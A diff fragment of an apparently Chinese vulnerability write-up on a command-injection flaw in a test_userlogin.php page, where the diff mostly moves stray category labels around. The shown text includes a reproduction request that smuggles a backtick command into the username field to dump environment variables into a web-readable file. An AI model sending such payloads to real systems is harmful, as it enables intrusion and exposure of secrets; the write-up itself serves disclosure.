@@ -33,17 +33,9 @@ if ($_REQUEST['testuser'] == 1){
     $reply = exec($comm);
 ```
 
-深入探索
-
-会计与审计
-
-计算机安全
-
-编程
-
 如果 `testuser=1` 则直接将 `username` 和 `password` 拼接进 `$comm` 中后使用 `exec` 直接[执行命令](https://mrxn.net/tag/rce "标签：执行命令")，无任何过滤或校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞，因此我们只需要闭合双引号即可完成[命令注入](https://mrxn.net/tag/rce "标签：命令注入")利用或者使用反引号执行命令。
 
-网络安全
+计算机安全
 
 # 漏洞复现
 
@@ -57,6 +49,14 @@ if ($_REQUEST['testuser'] == 1){
 GET /authentication/test_userlogin.php?testuser=1&username=`env>11.txt`%20%23%20 HTTP/1.1
 Host: unibox.mrxn.net
 ```
+
+深入探索
+
+网络
+
+黑客与破解
+
+编程
 
 访问[命令执行](https://mrxn.net/tag/rce "标签：命令执行")结果文件 `/authentication/11.txt`
 
